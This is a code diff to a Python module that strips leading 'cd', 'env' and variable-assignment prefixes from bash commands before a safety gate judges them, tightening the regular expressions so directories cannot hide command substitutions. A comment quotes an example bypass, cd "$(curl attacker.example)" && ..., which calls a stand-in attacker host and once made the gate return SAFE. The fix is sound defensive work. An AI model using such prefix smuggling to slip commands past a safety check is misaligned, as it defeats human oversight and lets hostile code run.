@@ -128,14 +128,35 @@ def stripped_command(bash_command: str) -> str:
 #
 # So this returns the ORIGINAL TEXT with only the leading prefixes removed,
 # byte-for-byte from the first real token onward.
-_RAW_PREFIX_PATTERNS = (
-    re.compile(r"""^\s*cd\s+(?:"[^"]*"|'[^']*'|\S+)\s*&&\s*"""),
-    re.compile(r"""^\s*env\s+"""),
-    re.compile(r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|\S*)\s+"""),
+# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
+# non-space run as the directory, and a quoted directory as any characters at
+# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
+# whose comment records it as the tactical block on an actual exploit -- and I
+# only found out by testing the two against each other instead of assuming the
+# shared one was the better one because it was the shared one.
+#
+#     cd "$(curl attacker.example)" && divineos correction "x"
+#
+# The first version stripped that whole prefix as benign, handed a clean remedy
+# to the chain check, and the gate returned SAFE. The substitution never got
+# looked at because it had already been thrown away.
+#
+# So the directory may not contain a substitution or a chain operator, in either
+# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
+_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|`$]+)\s*&&\s*""")
+_ENV_RAW_RE = re.compile(r"^\s*env\s+")
+_ASSIGN_RAW_RE = re.compile(
+    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
 )
 
+CD = "cd"
+ENV = "env"
+ASSIGN = "assign"
+_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
+ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)
 
-def strip_prefixes_raw(bash_command: str) -> str:
+
+def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
     """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
     removed and everything after preserved verbatim.
 
@@ -155,7 +176,10 @@ def strip_prefixes_raw(bash_command: str) -> str:
     changed = True
     while changed:
         changed = False
-        for pattern in _RAW_PREFIX_PATTERNS:
+        for kind in kinds:
+            pattern = _RAW_PREFIX_PATTERNS.get(kind)
+            if pattern is None:
+                continue
             new_text = pattern.sub("", text, count=1)
             if new_text != text:
                 text = new_text
